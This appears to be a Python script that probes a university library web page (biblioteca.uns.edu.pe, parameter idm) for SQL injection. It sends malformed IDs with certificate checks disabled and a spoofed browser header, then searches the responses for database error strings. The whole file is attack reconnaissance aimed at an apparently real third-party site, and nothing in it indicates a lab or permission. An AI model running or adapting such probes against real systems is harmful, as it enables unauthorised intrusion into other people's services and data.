import requests, urllib3, re
urllib3.disable_warnings()
h = {'User-Agent': 'Mozilla/5.0'}

for test_val in ['-1', 'abc', '0']:
    r = requests.get(f'https://biblioteca.uns.edu.pe/ver_libro.asp?idm={test_val}', headers=h, verify=False, timeout=8)
    clean = re.sub(r'<[^>]+>', ' ', r.text)
    print(f"idm={test_val} -> Status: {r.status_code}, Bytes: {len(r.content)}")
    # Buscar si hay mensajes de error tipicos de ASP / ODBC / SQL Server / Jet OLEDB
    for kw in ['error', 'microsoft', 'odbc', 'oledb', 'syntax', 'driver', 'exception', 'line']:
        if kw in r.text.lower():
            print(f"   [!] Encontrada palabra clave de error '{kw}' en la respuesta!")
            for line in r.text.splitlines():
                if kw in line.lower():
                    print(f"       -> {line.strip()[:150]}")
